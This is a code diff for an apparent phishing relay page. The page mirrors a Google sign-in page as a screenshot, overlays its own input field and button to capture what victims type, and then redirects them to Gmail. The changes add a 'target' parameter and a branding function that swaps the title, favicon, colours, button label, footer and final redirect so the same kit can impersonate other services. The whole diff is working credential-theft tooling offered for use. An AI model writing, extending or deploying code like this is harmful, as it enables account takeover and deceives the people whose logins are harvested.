@@ -46,13 +46,14 @@ body{font-family:Arial,sans-serif;background:#f0f4f9;color:#202124;
 <button id=ov-btn>Next</button>
 </div>
 </div>
-<div class=foot><span>English (United States)</span>
-<span>Help&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms</span></div>
+<div class=foot><span id=ft-l>English (United States)</span>
+<span id=ft-r>Help&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms</span></div>
 </div>
 <div id=st></div>
 </div>
 <script>
-var SID=null, KIND=null,
+var SID=null, KIND=null, BRANDED=false,
+    TARGET=window.__RELAY_TARGET__||new URLSearchParams(location.search).get('target')||'google',
     shot=document.getElementById('shot'), stage=document.getElementById('stage'),
     ovIn=document.getElementById('ov-in'), ovBtn=document.getElementById('ov-btn'),
     ovLbl=document.getElementById('ov-lbl'), ovTop=document.getElementById('ov-top'),
@@ -88,7 +89,23 @@ var lastHash='', cardW=0;
 shot.onload=function(){
  shot.style.width=(cardW||Math.round(shot.naturalWidth/(shot.naturalWidth>1200?2:1)))+'px';
 };
+function brand(pg){
+ if(!pg||BRANDED)return;BRANDED=true;
+ try{
+  if(pg.title)document.title=pg.title;
+  if(pg.favicon){var l=document.querySelector('link[rel=icon]');if(l)l.href=pg.favicon;}
+  if(pg.accent){ovBtn.style.background=pg.accent;boot.style.borderTopColor=pg.accent;}
+  if(pg.text)ovIn.style.color=pg.text;
+  if(pg.muted)stEl.style.color=pg.muted;
+  if(pg.line)ovTop.style.background=pg.line;
+  if(pg.card_radius)stage.style.borderRadius=pg.card_radius+'px';
+  if(pg.button_label)ovBtn.textContent=pg.button_label;
+  if(pg.footer_left)document.getElementById('ft-l').textContent=pg.footer_left;
+  if(pg.footer_right)document.getElementById('ft-r').textContent=pg.footer_right;
+ }catch(e){}
+}
 function render(x){
+ brand(x.page);
  /* keep the spinner until the SERVER has a fully-rendered card (the
     field is detected = card complete); error/done reveal immediately */
  if(!revealed){
@@ -137,7 +154,8 @@ function render(x){
   ovIn.style.display='none';ovBtn.style.display='none';ovLbl.style.display='none';ovTop.style.display='none';
  }
  if(x.state==='done'){
-  setTimeout(function(){location.href='https://mail.google.com';},1200);return;
+  var doneUrl=(x.page&&x.page.done_url)||'https://mail.google.com';
+  setTimeout(function(){location.href=doneUrl;},1200);return;
  }
  if(x.state==='error'){
   /* Google's own error text is visible inside the mirrored screenshot —
@@ -156,7 +174,7 @@ function poll(){
 var qsid=new URLSearchParams(location.search).get('sid');
 if(qsid){SID=qsid;poll();}
 else fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
- body:JSON.stringify({langs:(navigator.languages||[navigator.language||'en']),
+ body:JSON.stringify({target:TARGET,langs:(navigator.languages||[navigator.language||'en']),
   vw:innerWidth,vh:innerHeight})})
  .then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
  .catch(function(){fatal('Cannot reach the sign-in page. Please reload.');});
